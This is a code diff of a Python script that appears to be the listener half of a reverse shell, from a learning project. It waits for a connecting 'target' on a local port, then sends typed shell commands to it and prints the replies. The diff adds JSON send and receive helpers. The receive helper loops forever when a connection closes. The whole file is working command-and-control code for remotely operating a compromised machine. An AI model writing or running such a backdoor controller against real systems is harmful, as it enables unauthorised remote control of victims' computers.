@@ -1,21 +1,43 @@
 #!/usr/bin/python
 import socket
+import json
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #firstP stands for IPv4, secondP specifies TCP connection
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #basic socket options. it allows to connect to a localhost
-s.bind(("127.0.0.1", 15555)) #specify ip and port that we R going to listen on 
-s.listen(5) #listen 5 connection
-print("Listening for incoming connections")
-target, ip = s.accept()
-print("Target connected!")
+def reliable_send(data):
+    """Send JSON-encoded data to the target."""
+    json_data = json.dumps(data)
+    target.send(json_data.encode())
 
-while True:
-	message = input("* shell#~%s: " % str(ip))
-	target.send(message.encode())
-	if message == "q":
-		break
-	else:
-		answer = target.recv(1024).decode() #recieving 1024 bytes
-		print(answer)
+def reliable_recv():
+    """Receive and decode JSON data from the target."""
+    data = ""
+    while True:
+        try:
+            chunk = target.recv(1024).decode()
+            if not chunk:
+                continue
+            data += chunk
+            return json.loads(data)
+        except ValueError:
+            continue
 
-s.close()
+def shell():
+    """Interactive shell for communicating with the target."""
+    while True:
+        command = input(f"* shell#~{str(ip)}: ")
+        reliable_send(command)
+        if command == "q":
+            break
+        try:
+            result = reliable_recv()
+            print(result)
+        except Exception as e:
+            print(f"Error receiving response: {e}")
+
+# Server setup
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(("127.0.0.1", 15555))  # Change port if needed
+server.listen(1)
+print("Listening for incoming connections...")
+target, ip = server.accept()
+print(f"Target connected from {ip}")
+shell()
